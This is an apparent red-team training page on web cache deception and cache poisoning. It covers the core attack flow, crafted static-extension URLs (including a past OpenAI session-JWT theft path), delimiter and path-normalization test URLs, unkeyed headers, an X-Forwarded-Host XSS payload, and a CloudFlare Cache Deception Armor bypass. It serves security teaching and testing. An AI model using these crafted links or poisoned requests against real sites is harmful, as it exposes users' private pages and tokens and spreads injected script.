---
layout: training-page
title: "Web Cache Deception — Red Team Academy"
module: "Web Hacking"
tags:
  - web-cache-deception
  - cache-poisoning
  - account-takeover
  - cdn
page_key: "web-cache-deception-attacks"
render_with_liquid: false
---

# Web Cache Deception

Web Cache Deception (WCD) is an attack where an adversary tricks a caching layer (CDN, reverse
  proxy, or edge cache) into storing a sensitive, authenticated response as a publicly accessible
  cached asset. Once cached, any user — including the unauthenticated attacker — can retrieve the
  victim's private page content.

The root cause is a discrepancy between how the origin server and the caching layer interpret
  URLs: the origin serves dynamic content based on the authenticated session, while the cache
  sees a static file extension and stores the response permanently.

## Tools

- PortSwigger/param-miner Burp Extension — finds unkeyed cache inputs — `github.com/PortSwigger/param-miner`

## Core Attack Flow

Example scenario: victim is logged into `example.com`. Attacker tricks them into
  visiting `https://www.example.com/myaccount/home/malicious.css`.

1. Victim's browser requests `/myaccount/home/malicious.css`
2. Cache server misses — no cached entry yet
3. Request forwarded to origin server
4. Origin server ignores the `/malicious.css` suffix and returns the `/myaccount/home/` page (with session data) and cache-control headers saying "do not cache"
5. Response passes through the caching layer
6. Cache sees the `.css` extension, overrides the cache-control directive, and caches the response as a CSS asset
7. Attacker (unauthenticated) requests `/myaccount/home/malicious.css` and receives the victim's authenticated page from cache

## Exploitation Examples

### PayPal Home Page (Historical)

```
# Normal authenticated browse
https://www.example.com/myaccount/home/

# Attacker crafts and distributes this link:
https://www.example.com/myaccount/home/malicious.css

# Victim visits the link while authenticated
# Cache stores their account page as "malicious.css"

# Attacker retrieves cached victim data (unauthenticated)
curl https://www.example.com/myaccount/home/malicious.css
```

### OpenAI JWT Credential Theft

```
# Target: /api/auth/session returns JWT for authenticated users
# Attacker crafts a .css path:
https://chat.openai.com/api/auth/session/session.css

# Distributes link to victims
# Response is cached — contains bearer JWT
# Attacker harvests tokens from cache
```

## Detection Techniques

### Delimiter Discrepancy Testing

Some origin servers use delimiters like `;` to separate the real path from
  extra path components, while the caching layer does not understand the delimiter and treats the
  full string as a path to a static file.

```
# Semicolon delimiter (common in Java/Spring apps):
https://example.com/settings/profile;script.js

# Origin interprets: /settings/profile
# Cache interprets:  /settings/profile;script.js (sees .js, caches it)

# Slash variations:
https://example.com/app/conversation/.js?test
https://example.com/app/conversation/;.js
https://example.com/home.php/non-existent.css
```

### Path Normalization Testing

```
# Origin resolves path traversal; cache does not:
https://example.com/wcd/..%2fprofile

# Cache stores: /wcd/..%2fprofile (treated as a path with .css or static-like extension)
# Origin resolves: /profile (returns authenticated profile data)
```

## Cache Poisoning via Unkeyed Headers

A related technique: inject attacker-controlled values via headers that are not included in the
  cache key. If the application reflects the header value in the response, the poisoned response
  gets cached and served to all subsequent visitors.

```
# Common unkeyed inputs:
User-Agent
Cookie
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-Forwarded-Scheme
X-Original-URL  (Symfony)
X-Rewrite-URL   (Symfony)
```

```
# Example: X-Forwarded-Host injection (cache buster keeps this from poisoning the homepage)
GET /test?buster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: test"><script>alert(1)</script>

# If the app reflects X-Forwarded-Host in an og:image meta tag:
HTTP/1.1 200 OK
Cache-Control: public, no-cache
...
<meta property="og:image" content="https://test"><script>alert(1)</script>">

# This response gets cached — XSS payload served to all users who visit /test
```

## CloudFlare Specifics

CloudFlare CDN caches resources with `Cache-Control: public, max-age > 0`.
  It does not cache HTML by default, but caches based on file extension, not MIME type.
  Extensions that trigger caching include:

```
7Z  CSV  GIF  MIDI  PNG  TIF  ZIP  AVI  DOC  GZ   MKV  PPT  TIFF  ZST
CSS JS   ICO  MP3   MP4  PDF  SVG  WOFF WOFF2 TTF  OTF  BMP  JPG  JPEG
EXE JAR  APK  DMG   ISO  BIN  EJS  EOT  EPS   FLAC MID  PLS  TAR  XLSX
```

### CloudFlare Cache Deception Armor

When enabled, the Cache Deception Armor rule verifies that the URL extension matches the returned
  Content-Type. It is **not enabled by default**. Bypasses were found using
  `.avif` extension (HackerOne #1391635, now fixed).

```
# Bypass: .avif extension was not in the default deny list
https://example.com/myaccount/home/x.avif
```

## Resources

- PayloadsAllTheThings Web Cache Deception — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception`
- Web Cache Deception Attack — Omer Gil, 2017 — original research
- Practical Web Cache Poisoning — James Kettle, PortSwigger
- Web Cache Entanglement — James Kettle, PortSwigger
- OpenAI Account Takeover via WCD — Nagli, March 2023
- PortSwigger Labs — Web Cache Poisoning — `portswigger.net/web-security/all-labs#web-cache-poisoning`
- param-miner Burp extension — `github.com/PortSwigger/param-miner`
